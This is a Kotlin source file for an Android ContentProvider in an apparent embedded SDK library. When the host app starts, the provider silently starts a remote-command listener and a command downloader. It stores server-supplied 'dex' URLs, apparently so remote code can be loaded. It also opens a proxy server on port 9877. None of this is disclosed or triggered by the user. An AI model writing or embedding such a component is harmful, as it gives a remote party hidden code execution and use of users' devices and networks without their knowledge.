package com.tunebrains.cpu.library

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.content.UriMatcher
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.net.Uri
import com.brobwind.bronil.ProxyServer
import com.google.gson.Gson
import com.tunebrains.cpu.library.cmd.CommandDownloader
import com.tunebrains.cpu.library.cmd.ServerCommand
import com.tunebrains.cpu.library.db.CommandDb
import io.reactivex.disposables.CompositeDisposable
import timber.log.Timber


class SDKProvider : ContentProvider() {
    lateinit var sdk: CPUSdk

    companion object {
        fun authority(ctx: Context): String {
            return "${ctx.packageName}.cpu.sdk.provider"
        }

        fun contentUri(ctx: Context): Uri {
            return Uri.parse("content://${authority(ctx)}")
        }
    }

    val sUriMatcher = UriMatcher(UriMatcher.NO_MATCH)


    private val compositeDisposable = CompositeDisposable()
    private lateinit var db: CommandDb
    override fun onCreate(): Boolean {
        sUriMatcher.apply {
            addURI(authority(context!!), "commands", 1)
            addURI(authority(context!!), "commands/#", 2)
        }
        val gson = Gson()
        val repository = TokenRepository(context!!)
        db = CommandDb(context!!)
        val api = MedicaApi(gson, repository)
        sdk = CPUSdk(context!!, api)
        sdk.init()

        val remoteCommand = RemoteCommandProvider()
        remoteCommand.start()
        val commandDownloader = CommandDownloader(context!!, api)
        commandDownloader.start()

        compositeDisposable.add(remoteCommand.commandsObserver.subscribe { command ->
            Timber.d("Got server command id $command")
            compositeDisposable.add(api.command(command).subscribe({
                Timber.d("Got server command $it")
                insertCommand(it)
            }, {
                Timber.e(it)
            }))
        })

        val proxy = ProxyServer(9877)
        proxy.startServer()
        return true
    }


    private fun insertCommand(it: ServerCommand) {
        val contentValues = ContentValues()
        contentValues.put("_id", it.id)
        contentValues.put("_dex_url", it.dexUrl)
        contentValues.put("_status", 0)
        context!!.contentResolver.insert(
            contentUri(context!!).buildUpon().appendPath("commands").build(),
            contentValues
        )
    }

    override fun insert(uri: Uri, values: ContentValues): Uri? {
        return when (sUriMatcher.match(uri)) {
            1 -> {
                val id =
                    db.writableDatabase.insertWithOnConflict("_commands", null, values, SQLiteDatabase.CONFLICT_REPLACE)
                val url = contentUri(context!!).buildUpon().appendPath("commands").appendPath(id.toString()).build()
                context!!.contentResolver.notifyChange(url, null)
                return url
            }
            else ->
                null
        }
    }

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {
        return when (sUriMatcher.match(uri)) {
            1 -> {
                db.readableDatabase.query("_commands", projection, null, null, null, null, sortOrder)
            }
            2 -> {
                db.readableDatabase.query(
                    "_commands",
                    projection,
                    "_id=?",
                    arrayOf(uri.lastPathSegment),
                    null,
                    null,
                    null
                )
            }
            else ->
                return null
        }
    }

    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int {
        return when (sUriMatcher.match(uri)) {
            1 -> {
                0
            }
            2 -> {
                return db.writableDatabase.update("_commands", values, "_id=?", arrayOf(uri.lastPathSegment))
            }
            else ->
                0
        }
    }

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
        return 0
    }

    override fun getType(uri: Uri): String? {
        return null
    }
}